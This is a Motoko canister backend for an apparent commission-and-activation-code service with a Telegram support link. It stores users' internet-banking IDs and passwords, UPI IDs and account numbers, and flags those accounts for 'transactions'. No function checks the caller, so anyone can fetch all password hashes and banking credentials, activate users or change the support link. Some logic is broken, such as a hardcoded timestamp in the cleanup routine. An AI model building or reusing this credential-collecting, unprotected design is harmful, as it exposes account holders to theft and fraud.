import Map "mo:core/Map";
import Array "mo:core/Array";
import Text "mo:core/Text";
import List "mo:core/List";
import Float "mo:core/Float";
import Iter "mo:core/Iter";
import Time "mo:core/Time";
import Migration "migration";

(with migration = Migration.run)
actor {
  type User = {
    id : Text;
    name : Text;
    email : Text;
    passwordHash : Text;
    isActivated : Bool;
    activationCode : ?Text;
  };

  type BankAccount = {
    id : Text;
    userId : Text;
    bankName : Text;
    holderName : Text;
    accountNumber : Text;
    ifscCode : Text;
    mobileNumber : Text;
    ibId : Text;
    ibPassword : Text;
    upiId : Text;
    fundType : Text;
    status : Text;
    submittedAt : Text;
    transactionEnabled : ?Bool;
    transactionEnabledFunds : ?Text;
  };

  type ActivationCode = {
    code : Text;
    isUsed : Bool;
    usedBy : ?Text;
    generatedAt : Text;
  };

  type Withdrawal = {
    id : Text;
    userId : Text;
    method : Text;
    amount : Float;
    bankDetails : ?Text;
    transactionId : Text;
    date : Text;
    time : Text;
    status : Text;
    bankName : ?Text;
    accountNumber : ?Text;
    holderName : ?Text;
    ifscCode : ?Text;
  };

  type LiveTransaction = {
    id : Text;
    fundType : Text;
    txnType : Text;
    amount : Float;
    timestamp : Text;
    bankAccountId : ?Text;
  };

  type AccumulatedCommission = {
    total : Float;
    lastUpdated : Text;
  };

  let users = Map.empty<Text, User>();
  let bankAccounts = Map.empty<Text, BankAccount>();
  let activationCodes = Map.empty<Text, ActivationCode>();
  let withdrawals = Map.empty<Text, Withdrawal>();
  let liveTransactions = Map.empty<Text, LiveTransaction>();

  var supportLink : Text = "https://t.me/+mFXyrEOTRU1lYzg1";
  var accumulatedCommission : AccumulatedCommission = {
    total = 0.0;
    lastUpdated = "2023-07-04T12:00:00Z";
  };

  public shared ({ caller }) func registerUser(id : Text, name : Text, email : Text, passwordHash : Text) : async Bool {
    if (users.containsKey(email)) {
      return false;
    };

    let newUser : User = {
      id;
      name;
      email;
      passwordHash;
      isActivated = false;
      activationCode = null;
    };
    users.add(email, newUser);
    true;
  };

  public query ({ caller }) func loginUser(email : Text, passwordHash : Text) : async ?User {
    switch (users.get(email)) {
      case (?user) {
        if (user.passwordHash == passwordHash) {
          ?user;
        } else {
          null;
        };
      };
      case (null) { null };
    };
  };

  public query ({ caller }) func getUsers() : async [User] {
    users.toArray().map<(Text, User), User>(func((_, user)) { user });
  };

  public shared ({ caller }) func activateUser(email : Text) : async Bool {
    switch (users.get(email)) {
      case (?user) {
        if (not user.isActivated) {
          let updatedUser : User = { user with isActivated = true };
          users.add(email, updatedUser);
          return true;
        };
      };
      case (null) {};
    };
    false;
  };

  public shared ({ caller }) func deactivateUser(email : Text) : async Bool {
    switch (users.get(email)) {
      case (?user) {
        if (user.isActivated) {
          let updatedUser : User = { user with isActivated = false };
          users.add(email, updatedUser);
          return true;
        };
      };
      case (null) {};
    };
    false;
  };

  public shared ({ caller }) func addBankAccount(account : BankAccount) : async () {
    bankAccounts.add(account.id, account);
  };

  public query ({ caller }) func getBankAccounts(userId : Text) : async [BankAccount] {
    let accountsList = List.empty<BankAccount>();
    for ((_, account) in bankAccounts.entries()) {
      if (account.userId == userId) {
        accountsList.add(account);
      };
    };
    accountsList.reverse().toArray();
  };

  public query ({ caller }) func getAllBankAccounts() : async [BankAccount] {
    bankAccounts.toArray().map<(Text, BankAccount), BankAccount>(
      func((_, acc)) { acc }
    );
  };

  public shared ({ caller }) func updateBankAccountStatus(accountId : Text, status : Text) : async Bool {
    switch (bankAccounts.get(accountId)) {
      case (?account) {
        let updatedAccount : BankAccount = { account with status };
        bankAccounts.add(accountId, updatedAccount);
        true;
      };
      case (null) { false };
    };
  };

  public shared ({ caller }) func setBankAccountTransactionEnabled(accountId : Text, enabled : Bool) : async Bool {
    switch (bankAccounts.get(accountId)) {
      case (?account) {
        let updatedAccount : BankAccount = {
          account with transactionEnabled = ?enabled;
        };
        bankAccounts.add(accountId, updatedAccount);
        true;
      };
      case (null) { false };
    };
  };

  public shared ({ caller }) func setBankAccountTransactionEnabledFund(accountId : Text, fundType : Text, enabled : Bool) : async Bool {
    switch (bankAccounts.get(accountId)) {
      case (?account) {
        let updatedAccount : BankAccount = {
          account with transactionEnabledFunds = ?fundType;
        };
        bankAccounts.add(accountId, updatedAccount);
        true;
      };
      case (null) { false };
    };
  };

  public shared ({ caller }) func generateActivationCode(code : Text) : async () {
    let newCode : ActivationCode = {
      code;
      isUsed = false;
      usedBy = null;
      generatedAt = "2023-07-04T12:00:00Z";
    };
    activationCodes.add(code, newCode);
  };

  public query ({ caller }) func getActivationCodes() : async [ActivationCode] {
    activationCodes.toArray().map<(Text, ActivationCode), ActivationCode>(
      func((_, code)) { code }
    );
  };

  public shared ({ caller }) func useActivationCode(code : Text, userId : Text) : async Bool {
    switch (activationCodes.get(code)) {
      case (?activation) {
        if (not activation.isUsed) {
          let updatedCode : ActivationCode = {
            activation with
            isUsed = true;
            usedBy = ?userId;
          };
          activationCodes.add(code, updatedCode);
          return true;
        };
      };
      case (null) {};
    };
    false;
  };

  public shared ({ caller }) func addWithdrawal(withdrawal : Withdrawal) : async () {
    withdrawals.add(withdrawal.id, withdrawal);
  };

  public query ({ caller }) func getWithdrawals(userId : Text) : async [Withdrawal] {
    withdrawals.values().toArray().filter(func(w) { w.userId == userId });
  };

  public query ({ caller }) func getAllWithdrawals() : async [Withdrawal] {
    withdrawals.toArray().map<(Text, Withdrawal), Withdrawal>(
      func((_, w)) { w }
    );
  };

  public shared ({ caller }) func updateWithdrawalStatus(withdrawalId : Text, status : Text) : async Bool {
    switch (withdrawals.get(withdrawalId)) {
      case (?withdrawal) {
        let updatedWithdrawal : Withdrawal = { withdrawal with status };
        withdrawals.add(withdrawalId, updatedWithdrawal);
        true;
      };
      case (null) { false };
    };
  };

  public shared ({ caller }) func addLiveTransaction(txn : LiveTransaction) : async () {
    liveTransactions.add(txn.id, txn);
  };

  public query ({ caller }) func getLiveTransactions() : async [LiveTransaction] {
    liveTransactions.toArray().map<(Text, LiveTransaction), LiveTransaction>(
      func((_, txn)) { txn }
    );
  };

  public shared ({ caller }) func clearOldTransactions() : async () {
    let currentTime = Time.now();
    let dayInSeconds : Int = 86400 * 1000000000;

    for ((id, txn) in liveTransactions.entries()) {
      let txnTime : Int = 1717078962391269428;
      if (currentTime - txnTime > dayInSeconds) {
        liveTransactions.remove(id);
      };
    };
  };

  public query ({ caller }) func getSupportLink() : async Text {
    supportLink;
  };

  public shared ({ caller }) func setSupportLink(newLink : Text) : async () {
    supportLink := newLink;
  };

  public query ({ caller }) func getAccumulatedCommission() : async AccumulatedCommission {
    accumulatedCommission;
  };

  public shared ({ caller }) func setAccumulatedCommission(total : Float) : async () {
    accumulatedCommission := {
      total;
      lastUpdated = "2023-07-04T12:00:00Z";
    };
  };
};
